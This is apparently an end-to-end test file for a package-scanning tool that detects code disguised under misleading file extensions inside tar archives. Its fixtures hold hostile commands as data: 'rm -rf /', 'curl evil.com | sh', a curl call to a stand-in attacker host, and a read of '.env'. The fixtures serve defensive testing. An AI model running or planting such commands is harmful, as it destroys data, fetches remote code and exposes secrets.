#!/usr/bin/env python3
"""E2E integration test: content sniffing in archive extraction and prefilter."""
import io
import tarfile
import sys

sys.path.insert(0, "src")

from aigate.content_sniff import CODE_TYPES, detect_extension_mismatch, sniff_content_type
from aigate.resolver import _extract_archive
from aigate.prefilter import check_extension_mismatch as check_ext_mismatch

def test_archive_extraction():
    """Build a tar.gz with disguised files, verify extraction."""
    print("=== Test 1: Archive Extraction ===")
    
    buf = io.BytesIO()
    entries = {
        "pkg-1.0/setup.py": "from setuptools import setup\nsetup(name='x')\n",
        "pkg-1.0/logo.png": "#!/usr/bin/env python3\nimport os\nos.system('rm -rf /')\n",
        "pkg-1.0/run": "import subprocess\nsubprocess.call(['curl', 'evil.com'])\n",
        "pkg-1.0/styles.css": "const fs = require('fs');\nfs.readFileSync('.env');\n",
        "pkg-1.0/README.md": "# Innocent README\nNothing to see here.\n",
    }
    
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for path, content in entries.items():
            data = content.encode("utf-8")
            info = tarfile.TarInfo(name=path)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    
    result = _extract_archive(buf.getvalue(), "pkg.tar.gz")
    
    # Check: disguised files ARE extracted
    assert "pkg-1.0/logo.png" in result, "FAIL: Python in .png not extracted!"
    assert "pkg-1.0/run" in result, "FAIL: Extensionless Python not extracted!"
    assert "pkg-1.0/styles.css" in result, "FAIL: JS in .css not extracted!"
    assert "pkg-1.0/setup.py" in result, "FAIL: Normal .py not extracted!"
    assert "pkg-1.0/README.md" in result, "PASS: README.md is extracted (it's in whitelist)"
    
    print(f"  Extracted {len(result)} files: {list(result.keys())}")
    print("  ✅ All disguised files detected and extracted\n")

def test_extension_mismatch_signals():
    """Verify prefilter generates extension_mismatch signals."""
    print("=== Test 2: Extension Mismatch Signals ===")
    
    source_files = {
        "pkg-1.0/logo.png": "#!/usr/bin/env python3\nimport os\nos.system('evil')\n",
        "pkg-1.0/run": "import subprocess\nsubprocess.call(['curl', 'evil.com'])\n",
        "pkg-1.0/styles.css": "const fs = require('fs');\nfs.readFileSync('.env');\n",
        "pkg-1.0/main.py": "import os\nprint('hello')\n",  # Normal — no mismatch
    }
    
    signals = check_ext_mismatch(source_files)
    
    print(f"  Signals generated: {len(signals)}")
    for s in signals:
        print(f"    {s}")
    
    # png should trigger
    png_signals = [s for s in signals if "logo.png" in s]
    assert len(png_signals) == 1, f"FAIL: Expected 1 png mismatch, got {len(png_signals)}"
    assert "python" in png_signals[0].lower(), "FAIL: png signal doesn't mention python"
    
    # extensionless should trigger
    ext_signals = [s for s in signals if "'run'" in s]
    assert len(ext_signals) == 1, f"FAIL: Expected 1 extensionless mismatch, got {len(ext_signals)}"
    
    # css should trigger (contains JS)
    css_signals = [s for s in signals if "styles.css" in s]
    assert len(css_signals) == 1, f"FAIL: Expected 1 css mismatch, got {len(css_signals)}"
    
    # main.py should NOT trigger
    py_signals = [s for s in signals if "main.py" in s]
    assert len(py_signals) == 0, f"FAIL: main.py should not trigger mismatch"
    
    print("  ✅ All mismatch signals correct\n")

def test_content_sniff_accuracy():
    """Test sniffing on adversarial samples."""
    print("=== Test 3: Content Sniff Accuracy ===")
    
    cases = [
        # (content, expected_type, description)
        ("#!/usr/bin/env python3\nimport os\n", "python", "Python shebang"),
        ("#!/usr/bin/env node\nconsole.log('hi')\n", "javascript", "Node shebang"),
        ("#!/bin/bash\necho hello\n", "shell", "Bash shebang"),
        ("import subprocess\nsubprocess.call(['evil'])\n", "python", "Python import"),
        ("const fs = require('fs');\n", "javascript", "JS require"),
        ("This is just plain text.\n", None, "Plain text"),
        ("\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00", None, "Real PNG binary"),
        ('{"name": "test"}\n', "json", "JSON"),
    ]
    
    all_pass = True
    for content, expected, desc in cases:
        result = sniff_content_type(content)
        status = "✅" if result == expected else "❌"
        if result != expected:
            all_pass = False
        print(f"  {status} {desc}: expected={expected}, got={result}")
    
    assert all_pass, "FAIL: Some sniff tests failed"
    print("  ✅ All sniff tests passed\n")

def test_full_pipeline():
    """End-to-end: build archive → extract → prefilter → signals."""
    print("=== Test 4: Full Pipeline (archive → prefilter) ===")
    
    from aigate.config import Config
    from aigate.models import PackageInfo
    from aigate.prefilter import run_prefilter
    
    # Build a tar.gz with a Python-in-PNG attack
    buf = io.BytesIO()
    entries = {
        "evil-1.0/setup.py": "from setuptools import setup\nsetup(name='evil')\n",
        "evil-1.0/icon.png": "#!/usr/bin/env python3\nimport os\nos.system('curl evil.com | sh')\n",
    }
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for path, content in entries.items():
            data = content.encode("utf-8")
            info = tarfile.TarInfo(name=path)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    
    # Extract
    source_files = _extract_archive(buf.getvalue(), "evil.tar.gz")
    assert "evil-1.0/icon.png" in source_files, "FAIL: disguised file not extracted"
    
    # Prefilter
    pkg = PackageInfo(name="evil-package", version="1.0", ecosystem="pypi")
    config = Config()
    result = run_prefilter(pkg, config, source_files)
    
    mismatch_signals = [s for s in result.risk_signals if "extension_mismatch" in s]
    print(f"  Source files extracted: {list(source_files.keys())}")
    print(f"  Total risk signals: {len(result.risk_signals)}")
    print(f"  Extension mismatch signals: {len(mismatch_signals)}")
    for s in mismatch_signals:
        print(f"    {s}")
    
    assert len(mismatch_signals) >= 1, "FAIL: No extension_mismatch in pipeline!"
    assert "icon.png" in mismatch_signals[0], "FAIL: icon.png not in mismatch signal"
    assert result.needs_ai_review, "FAIL: Should need AI review"
    
    print(f"  Risk level: {result.risk_level}")
    print(f"  Needs AI review: {result.needs_ai_review}")
    print("  ✅ Full pipeline works correctly\n")


if __name__ == "__main__":
    test_content_sniff_accuracy()
    test_archive_extraction()
    test_extension_mismatch_signals()
    test_full_pipeline()
    print("=" * 60)
    print("🎉 ALL E2E INTEGRATION TESTS PASSED")
    print("=" * 60)
